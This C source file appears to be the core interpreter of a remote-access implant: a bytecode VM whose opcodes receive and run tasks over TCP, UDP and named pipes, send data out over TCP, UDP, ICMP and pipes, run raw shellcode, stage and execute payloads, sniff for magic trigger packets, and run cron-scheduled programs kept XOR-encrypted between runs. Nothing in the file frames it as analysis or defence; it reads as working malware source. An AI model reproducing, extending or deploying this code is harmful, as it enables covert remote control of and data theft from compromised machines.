/*
 * sw_bytecode.c - the 23-opcode command language interpreter (C VM).
 *
 * The VM is a single switch-dispatch loop that consumes `code` of `len`
 * bytes. Each instruction starts with a 1-byte opcode followed by the
 * operands the opcode specifies (fixed-width big-endian integers and
 * length-prefixed string/blob fields). A handful of opcodes carry a
 * nested program as one of their fields; the same parser runs over the
 * nested bytes when they are reached.
 *
 * CRON_SCHEDULE's nested program is XOR-encrypted with a 4-byte
 * repeating key in the wire format. The VM decrypts before executing,
 * then re-XORs after execution so the nested program stays protected
 * while sitting between scheduled runs.
 */
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#endif

#include "sw_core.h"
#include "sw_impl.h"

/* Platform sleep: usleep() is POSIX; on Windows use Sleep() in ms. The
 * bytecode TU compiles into both the native tests and the Windows DLL, so
 * normalise to an SW_sleep_us(usecs) helper. */
static void sw_sleep_us(long usecs) {
#ifdef _WIN32
    Sleep((DWORD)(usecs >= 1000 ? usecs / 1000 : 1));
#else
    usleep((unsigned int)usecs);
#endif
}

/* ------------------------------------------------------------------ */
/* Constants / limits                                                  */
/* ------------------------------------------------------------------ */
#define SW_MAX_NESTING      8
#define SW_MAX_INSTRUCTIONS (0x000FFFFF)   /* 20-bit unsigned max, fits in int */

/* ------------------------------------------------------------------ */
/* Cursor                                                              */
/* ------------------------------------------------------------------ */
typedef struct { const uint8_t *p; const uint8_t *end; } cur;

static int r_u8(cur *c, uint8_t *o) {
    if (c->p + 1 > c->end) return -1;
    *o = *c->p++; return 0;
}
static int r_u16(cur *c, uint16_t *o) {
    if (c->p + 2 > c->end) return -1;
    *o = (uint16_t)((c->p[0] << 8) | c->p[1]);
    c->p += 2; return 0;
}
static int r_u32(cur *c, uint32_t *o) {
    if (c->p + 4 > c->end) return -1;
    *o = (uint32_t)((uint32_t)c->p[0] << 24) | (uint32_t)c->p[1] << 16
         | (uint32_t)c->p[2] << 8 | (uint32_t)c->p[3];
    c->p += 4; return 0;
}
static int r_u64(cur *c, uint64_t *o) {
    if (c->p + 8 > c->end) return -1;
    uint64_t v = 0;
    for (int i = 0; i < 8; i++) v = (v << 8) | c->p[i];
    c->p += 8; *o = v; return 0;
}
static int r_str(cur *c, char *dst, size_t cap) {
    sw_reader r = { c->p, c->end };
    int rc = sw_read_string(&r, dst, cap, NULL);
    if (rc) return rc;
    c->p = r.p;
    return 0;
}
static int r_blob(cur *c, const uint8_t **out, uint32_t *len) {
    sw_reader r = { c->p, c->end };
    int rc = sw_read_blob(&r, out, len);
    if (rc) return rc;
    c->p = r.p;
    return 0;
}

/* ------------------------------------------------------------------ */
/* CRON_SCHEDULE XOR                                                    */
/* ------------------------------------------------------------------ */
static void cron_xor(uint8_t *buf, uint32_t len) {
    const uint8_t *key = SW_CRON_XOR_KEY();
    for (uint32_t i = 0; i < len; i++)
        buf[i] ^= key[i % SW_CRON_XOR_KEY_LEN];
}

/* ------------------------------------------------------------------ */
/* Forward decls                                                       */
/* ------------------------------------------------------------------ */
static int sw_run_n(const uint8_t *code, uint32_t len, int depth);

/* ------------------------------------------------------------------ */
/* Sleep helpers (jittered pauses)                                     */
/* ------------------------------------------------------------------ */
static void sleep_for(uint32_t secs) {
    /* Poll the stop flag every 100 ms so EXIT can wake us. 10 ticks per
     * second, so a request for N seconds actually sleeps N seconds. */
    long ticks = (long)secs * 10;
    for (long t = 0; t < ticks && !sw_stop_flag; t++)
        sw_sleep_us(100 * 1000);
}
static void sleep_jittered(uint32_t modulus) {
    if (modulus == 0) modulus = 1;
    sleep_for((uint32_t)(sw_random_u32() % modulus));
}

/* Spinlock guarding the shared staging arena against concurrent
 * SPAWN_THREAD_SCRIPT child interpreters. Held only for the direct
 * arena accesses (memcpy / length update / SHA read), never across a
 * nested sw_run_n (which would deadlock on a recursive STAGE_WRITE). */
static volatile LONG g_stage_lock = 0;
static void stage_lock(void) {
    while (InterlockedExchange((volatile LONG*)&g_stage_lock, 1) != 0)
        sw_sleep_us(100);
}
static void stage_unlock(void) {
    InterlockedExchange((volatile LONG*)&g_stage_lock, 0);
}

static int run_nested(const uint8_t *code, uint32_t len, int depth) {
    stage_lock();
    uint32_t save = sw_stage_arena_len;
    stage_unlock();
    int rc = sw_run_n(code, len, depth + 1);
    stage_lock();
    sw_stage_arena_len = save;
    stage_unlock();
    return rc;
}

/* ------------------------------------------------------------------ */
/* CRON mask check                                                     */
/* ------------------------------------------------------------------ */
/* Platform localtime: MSVC localime_s(out,in); POSIX localtime_r(in,out). */
static void sw_localtime(struct tm *out, const time_t *in) {
#ifdef _WIN32
    localtime_s(out, in);
#else
    struct tm *r = localtime_r(in, out);
    if (!r) memset(out, 0, sizeof *out);   /* out-of-range time -> epoch */
#endif
}

static int cron_match(const struct tm *now,
                      uint64_t minute_mask, uint32_t hour_mask,
                      uint32_t dom_mask, uint8_t dow_mask) {
    /* minute: bits 0..59 (bit i = minute i); minute 0 is bit 0 */
    int mm = !!(minute_mask & (1ull << (uint64_t)now->tm_min));
    int hm = !!(hour_mask & (1u << (uint32_t)now->tm_hour));
    int dm = (dom_mask == 0xFFFFFFFFu) ? 1
             : !!(dom_mask & (1u << (uint32_t)now->tm_mday));
    int dw = !!(dow_mask & (1u << (uint32_t)now->tm_wday));
    sw_dbg("cron: min=%d mm=%d hm=%d dm=%d dw=%d", now->tm_min, mm, hm, dm, dw);
    if (!mm) return 0;
    if (!hm) return 0;
    if (!dm) return 0;
    if (!dw) return 0;
    return 1;
}

/* ------------------------------------------------------------------ */
/* The interpreter                                                     */
/* ------------------------------------------------------------------ */
static int sw_run_n(const uint8_t *code, uint32_t len, int depth) {
    if (depth > SW_MAX_NESTING) return -1;
    cur c = { code, code + len };
    int executed = 0;

    while (c.p < c.end) {
        if (sw_stop_flag) return executed;
        if (executed >= SW_MAX_INSTRUCTIONS) break;   /* runaway-script cap */

        const uint8_t op = *c.p;
        sw_dbg("vm: opcode 0x%02x at off=%u len=%u", op,
               (unsigned)(c.p - code), len);
        switch (op) {

        /* --- Basic control ---------------------------------------- */
        case SW_OP_EXIT: {
            c.p++;
            (void)InterlockedExchange(&sw_stop_flag, 1);
            return executed;
        }
        case SW_OP_SPAWN_THREAD_SCRIPT: {
            c.p++;
            const uint8_t *nested; uint32_t nlen;
            if (r_blob(&c, &nested, &nlen)) return -1;
            /* Spawn a thread that runs the nested program. sw_spawn_thread_run
             * heap-allocates a private copy with a little-endian length
             * header, and the thread entry releases the buffer once the
             * interpreter has consumed it. */
            (void)sw_spawn_thread_run(nested, nlen);
            executed++;
            continue;
        }
        /* --- Timing ----------------------------------------------- */
        case SW_OP_SLEEP_SECONDS: {
            c.p++;
            uint16_t s;
            if (r_u16(&c, &s)) return -1;
            sleep_for(s);
            executed++;
            continue;
        }
        case SW_OP_SLEEP_RANDOM: {
            c.p++;
            uint16_t s;
            if (r_u16(&c, &s)) return -1;
            sleep_jittered(s);
            executed++;
            continue;
        }
        case SW_OP_CRON_SCHEDULE: {
            c.p++;
            uint64_t mm; uint32_t hm, dm; uint8_t dw;
            if (r_u64(&c, &mm)) return -1;
            if (r_u32(&c, &hm)) return -1;
            if (r_u32(&c, &dm)) return -1;
            uint8_t dwb;
            if (r_u8(&c, &dwb)) return -1;
            dw = dwb;
            const uint8_t *nested; uint32_t nlen;
            if (r_blob(&c, &nested, &nlen)) return -1;
            if (nlen == 0) { executed++; continue; }
            uint8_t *work = (uint8_t *)sw_malloc(nlen);
            if (!work) return -1;
            memcpy(work, nested, nlen);
            for (;;) {
                struct tm now;
                time_t t = time(NULL);
                sw_localtime(&now, &t);
                while (!sw_stop_flag && !cron_match(&now, mm, hm, dm, dw)) {
                    sw_sleep_us(600 * 1000);
                    time_t t2 = time(NULL);
                    sw_localtime(&now, &t2);
                }
                if (sw_stop_flag) break;
                /* Decrypt immediately before each run, re-encrypt after, so
                 * the nested program stays XOR-protected while waiting. */
                cron_xor(work, nlen);      /* decrypt */
                int rc = run_nested(work, nlen, depth);
                cron_xor(work, nlen);      /* re-encrypt after the tick */
                if (rc < 0) { sw_free(work); return rc; }
            }
            sw_free(work);
            executed++;
            continue;
        }
        case SW_OP_REPEAT_N: {
            c.p++;
            uint16_t n;
            if (r_u16(&c, &n)) return -1;
            const uint8_t *s; uint32_t slen;
            if (r_blob(&c, &s, &slen)) return -1;
            for (uint16_t i = 0; i < n && !sw_stop_flag; i++) {
                int rc = run_nested(s, slen, depth);
                if (rc < 0) return rc;
                executed++;
            }
            continue;
        }
        case SW_OP_LOOP_FOREVER: {
            c.p++;
            const uint8_t *s; uint32_t slen;
            if (r_blob(&c, &s, &slen)) return -1;
            for (;;) {
                if (sw_stop_flag) break;
                int rc = run_nested(s, slen, depth);
                if (rc < 0) return rc;
                 sw_sleep_us(1 * 1000);   /* Let the scheduler breathe. */
            }
            continue;
        }
        /* --- Sending data ------------------------------------------ */
        case SW_OP_TCP_SEND:
        case SW_OP_UDP_SEND: {
            c.p++;
            char la[64], lp[64], rh[64], rp[64];
            if (r_str(&c, la, sizeof la) || r_str(&c, lp, sizeof lp) ||
                r_str(&c, rh, sizeof rh) || r_str(&c, rp, sizeof rp))
                return -1;
            const uint8_t *blob; uint32_t blen;
            if (r_blob(&c, &blob, &blen)) return -1;
            uint16_t dl;
            if (r_u16(&c, &dl)) return -1;
            int rc = (op == SW_OP_TCP_SEND)
                   ? sw_tcp_send(la, lp, rh, rp, blob, blen, dl)
                   : sw_udp_send(la, lp, rh, rp, blob, blen, dl);
            if (rc) return rc;
            executed++;
            continue;
        }
        case SW_OP_ICMP_SEND: {
            c.p++;
            char src[64], dst[64];
            if (r_str(&c, src, sizeof src) || r_str(&c, dst, sizeof dst))
                return -1;
            const uint8_t *blob; uint32_t blen;
            if (r_blob(&c, &blob, &blen)) return -1;
            uint16_t dl;
            if (r_u16(&c, &dl)) return -1;
            int rc = sw_icmp_send(src, dst, blob, blen, dl);
            if (rc) return rc;
            executed++;
            continue;
        }
        case SW_OP_PIPE_SEND: {
            c.p++;
            char server[64], pipe[64], user[64], pass[64];
            if (r_str(&c, server, sizeof server) ||
                r_str(&c, pipe, sizeof pipe)     ||
                r_str(&c, user, sizeof user)     ||
                r_str(&c, pass, sizeof pass))
                return -1;
            const uint8_t *blob; uint32_t blen; uint16_t dl;
            if (r_blob(&c, &blob, &blen) || r_u16(&c, &dl)) return -1;
            int rc = sw_pipe_send(server, pipe, user, pass, blob, blen, dl);
            if (rc) return rc;
            executed++;
            continue;
        }
        /* --- Inbound task reception -------------------------------- */
        case SW_OP_TCP_CONNECT_RECV: {
            c.p++;
            char la[64], lp[64], rh[64], rp[64];
            if (r_str(&c, la, sizeof la) || r_str(&c, lp, sizeof lp) ||
                r_str(&c, rh, sizeof rh) || r_str(&c, rp, sizeof rp))
                return -1;
            uint16_t dl;
            if (r_u16(&c, &dl)) return -1;
            uint8_t task[4096]; uint32_t tlen;
            int rc = sw_tcp_connect_recv(la, lp, rh, rp, dl, task, sizeof task, &tlen);
            if (rc < 0) return rc;
            if (rc > 0 && tlen > 0) {
                int rc2 = sw_run_bytecode(task, tlen);
                if (rc2 < 0) return rc2;
            }
            continue;
        }
        case SW_OP_TCP_LISTEN_RECV: {
            c.p++;
            char a[64], b[64]; uint16_t dl;
            if (r_str(&c, a, sizeof a) || r_str(&c, b, sizeof b)) return -1;
            if (r_u16(&c, &dl)) return -1;
            uint8_t task[4096]; uint32_t tlen;
            int rc = sw_tcp_listen_recv(a, b, dl, task, sizeof task, &tlen);
            if (rc < 0) return rc;
            if (rc > 0 && tlen > 0) {
                int rc2 = sw_run_bytecode(task, tlen);
                if (rc2 < 0) return rc2;
            }
            continue;
        }
        case SW_OP_UDP_BIND_RECV: {
            c.p++;
            char a[64], b[64]; uint16_t dl;
            if (r_str(&c, a, sizeof a) || r_str(&c, b, sizeof b)) return -1;
            if (r_u16(&c, &dl)) return -1;
            uint8_t task[4096]; uint32_t tlen;
            int rc = sw_udp_bind_recv(a, b, dl, task, sizeof task, &tlen);
            if (rc < 0) return rc;
            if (rc > 0 && tlen > 0) {
                int rc2 = sw_run_bytecode(task, tlen);
                if (rc2 < 0) return rc2;
            }
            continue;
        }
        case SW_OP_PIPE_CLIENT_RECV: {
            c.p++;
            char srv[64], p[64], u[64], pw[64]; uint16_t dl;
            if (r_str(&c, srv, sizeof srv) || r_str(&c, p, sizeof p) ||
                r_str(&c, u, sizeof u)     || r_str(&c, pw, sizeof pw))
                return -1;
            if (r_u16(&c, &dl)) return -1;
            uint8_t task[4096]; uint32_t tlen;
            int rc = sw_pipe_client_recv(srv, p, u, pw, dl, task, sizeof task, &tlen);
            if (rc < 0) return rc;
            if (rc > 0 && tlen > 0) {
                int rc2 = sw_run_bytecode(task, tlen);
                if (rc2 < 0) return rc2;
            }
            continue;
        }
        case SW_OP_PIPE_SERVER_RECV: {
            c.p++;
            char a[64], b[64]; uint16_t dl;
            if (r_str(&c, a, sizeof a) || r_str(&c, b, sizeof b)) return -1;
            if (r_u16(&c, &dl)) return -1;
            uint8_t task[4096]; uint32_t tlen;
            int rc = sw_pipe_server_recv(a, b, dl, task, sizeof task, &tlen);
            if (rc < 0) return rc;
            if (rc > 0 && tlen > 0) {
                int rc2 = sw_run_bytecode(task, tlen);
                if (rc2 < 0) return rc2;
            }
            continue;
        }
        /* --- Building and running programs ------------------------- */
        case SW_OP_STAGE_WRITE: {
            c.p++;
            uint32_t off; const uint8_t *chunk; uint32_t clen;
            if (r_u32(&c, &off) || r_blob(&c, &chunk, &clen)) return -1;
            if (off > SW_STAGE_ARENA_SIZE || clen > SW_STAGE_ARENA_SIZE
                || off + clen > SW_STAGE_ARENA_SIZE) return -1;
            stage_lock();
            memcpy(sw_stage_arena + off, chunk, clen);
            if (off + clen > sw_stage_arena_len)
                sw_stage_arena_len = off + clen;
            stage_unlock();
            executed++;
            continue;
        }
        case SW_OP_STAGE_VERIFY_EXEC: {
            c.p++;
            uint32_t vlen; const uint8_t *sha; uint32_t sha_len;
            if (r_u32(&c, &vlen) || r_blob(&c, &sha, &sha_len)) return -1;
            if (sha_len != 32) return -1;
            /* The fingerprint length must lie within the staging arena (and
             * only cover bytes that were actually staged), or we would read
             * past the arena / hash uninitialised bytes. */
            if (vlen > SW_STAGE_ARENA_SIZE || vlen > sw_stage_arena_len)
                return -1;
            uint8_t digest[32];
            stage_lock();
            sw_sha256(sw_stage_arena, vlen, digest);
            stage_unlock();
            if (memcmp(digest, sha, 32) != 0) {
                executed++;
                continue;
            }
            int rc = run_nested(sw_stage_arena, vlen, depth);
            if (rc < 0) return rc;
            executed++;
            continue;
        }
        case SW_OP_DECOMPRESS_RUN: {
            c.p++;
            uint32_t unpacked;
            const uint8_t *props, *comp;
            uint32_t comp_len;
            if (r_u32(&c, &unpacked))          return -1;
            /* lzma_properties is a fixed 5-byte structure (no length
             * prefix), then a length-prefixed compressed-data blob. */
            if (c.p + 5 > c.end) return -1;
            props = c.p;
            c.p += 5;
            if (r_blob(&c, &comp,  &comp_len)) return -1;
            uint8_t *out = (uint8_t *)sw_malloc(unpacked);
            if (!out) return -1;
            memset(out, 0, unpacked);
            int rc = sw_lzma_decompress(props, comp, comp_len, out, unpacked);
            if (rc) { sw_free(out); return rc; }
            rc = run_nested(out, unpacked, depth);
            sw_free(out);
            if (rc < 0) return rc;
            executed++;
            continue;
        }
        case SW_OP_RUN_SHELLCODE: {
            c.p++;
            const uint8_t *sc; uint32_t sclen;
            if (r_blob(&c, &sc, &sclen)) return -1;
            int rc = sw_run_shellcode(sc, sclen);
            if (rc) return rc;
            executed++;
            continue;
        }
        case SW_OP_RUN_FILE_SCRIPT: {
            c.p++;
            char path[256];
            if (r_str(&c, path, sizeof path)) return -1;
            int rc = sw_run_file_script(path);
            if (rc) return rc;
            executed++;
            continue;
        }
        /* --- Trigger detection ------------------------------------- */
        case SW_OP_SNIFF_MAGIC:
        case SW_OP_SNIFF_MAGIC_DNS: {
            c.p++;
            char iface[64]; uint16_t dl;
            if (r_str(&c, iface, sizeof iface)) return -1;
            if (r_u16(&c, &dl)) return -1;
            int mode = (op == SW_OP_SNIFF_MAGIC) ? SW_SNIFF_RAW : SW_SNIFF_RAW_DNS;
            int rc = sw_sniff_magic(iface, (uint32_t)dl, mode, depth);
            if (rc) return rc;
            executed++;
            continue;
        }
        default:
            (void)op;
            return -2;   /* unknown opcode */
        }
    }
    return executed;
}

int sw_run_bytecode(const uint8_t *code, uint32_t len) {
    return sw_run_n(code, len, 0);
}

/* Spawn an interpreter thread that runs `code` of `len` bytes.  The buffer
 * handed to the thread is a private copy; it is released once the
 * interpreter has consumed it.  This keeps the buffer alive across the
 * CreateThread call on Windows (where the child owns it) and across the
 * calling frame on native test builds (where CreateThread runs inline). */
uintptr_t sw_spawn_thread_run(const uint8_t *code, uint32_t len) {
    uint8_t *copy = (uint8_t *)sw_malloc(len + 4);
    if (!copy) return 0;
    uint32_t le = len;
    memcpy(copy, &le, 4);
    memcpy(copy + 4, code, len);
#ifdef _WIN32
    /* On Windows this is the LPTHREAD_START_ROUTINE passed to CreateThread;
     * the trampoline owns `copy` and frees it once the nested interpreter
     * has consumed it. */
    HANDLE h = CreateThread(NULL, 0,
                            (LPTHREAD_START_ROUTINE)ThreadProc_trampoline,
                            copy, 0, NULL);
    if (!h) { sw_free(copy); return 0; }
    CloseHandle(h);
    return (uintptr_t)h;
#else
    /* Native unit-test path: CreateThread shim runs inline. */
    return (uintptr_t)ThreadProc_trampoline(copy);
#endif
}

/*
 * Thread entry for an interpreter thread. The first 4 bytes of the heap
 * buffer are a little-endian u32 length; the remainder is the program. The
 * buffer is freed once the interpreter has consumed it.
 *
 * On Windows this is the value passed to CreateThread as a
 * LPTHREAD_START_ROUTINE: the caller casts it (function-pointer types are
 * compatible with __stdcall on the x64 ABI, where there is no calling
 * convention). On native test builds the CreateThread shim in sw_impl.h
 * invokes it directly, so a plain declaration is fine.
 */
#ifdef _WIN32
uintptr_t ThreadProc_trampoline(LPVOID arg) {
#else
uintptr_t ThreadProc_trampoline(void *arg) {
#endif
    uint8_t *code = (uint8_t *)arg;
    uint32_t len;
    memcpy(&len, code, 4);
    int rc = sw_run_bytecode(code + 4, len);
    sw_free(code);
    (void)rc;
    return 0;
}
